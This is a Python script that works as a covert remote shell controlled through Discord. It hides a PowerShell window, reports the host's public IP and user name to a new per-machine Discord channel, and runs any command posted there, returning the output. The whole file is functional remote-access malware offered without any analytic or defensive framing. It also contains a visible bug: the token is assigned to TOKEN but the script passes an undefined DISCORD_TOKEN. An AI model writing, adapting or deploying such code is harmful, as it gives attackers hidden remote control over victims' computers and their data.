import discord
import requests
import subprocess
import typing


TOKEN = "PASTE DISCORD BOT TOKEN HERE"

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

ps = subprocess.Popen(
    ["powershell", "-NoLogo", "-NoExit", "-Command", "-"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    bufsize=1,
    creationflags=subprocess.CREATE_NO_WINDOW
)

current_dir: typing.Optional[str] = None

def execute_cmd(cmd):
    marker = "__CMD_DONE__"
    wrapped = f"""
    try {{
        {cmd}
    }} catch {{
        Write-Output "$($_.Exception.Message)"
    }}
    """

    ps.stdin.write(wrapped + "\n")
    ps.stdin.write(f'Write-Output "{marker}"\n')
    ps.stdin.flush()
    output = []

    for line in ps.stdout:
        if marker in line:
            break
        output.append(line.rstrip())

    return "\n".join(output)


@client.event
async def on_ready():
    global channel
    global current_dir

    guild = client.guilds[0]
    ip = requests.get("https://api.ipify.org").text.replace(".", "-")
    channel = await guild.create_text_channel("c-" + ip)

    try:
        who = execute_cmd("whoami").strip()
    except Exception:
        who = "<error>"

    try:
        cwd = execute_cmd("pwd").strip()
    except Exception:
        cwd = "<unknown>"

    current_dir = cwd
    await channel.send(f"Connected. whoami: {who}\ncwd: {cwd}")

@client.event
async def on_message(message):
    if not channel or message.channel.id != channel.id:
        return
    if message.author.bot:
        return

    cmd = message.content.strip()
    result = execute_cmd(cmd) or f"Executed {cmd} with no output."

    try:
        verb = cmd.split()[0].lower() if cmd else ""
    except Exception:
        verb = ""

    if verb in ("cd", "set-location", "pushd", "popd"):
        try:
            cwd = execute_cmd("pwd").strip()
        except Exception:
            cwd = "<unknown>"
        current_dir = cwd
        result = f"{result}\n\n[cwd updated] {cwd}"

    while True:
        await message.channel.send(result[:2000])
        if len(result) < 2000:
            break
        result = result[2000:]


client.run(DISCORD_TOKEN)
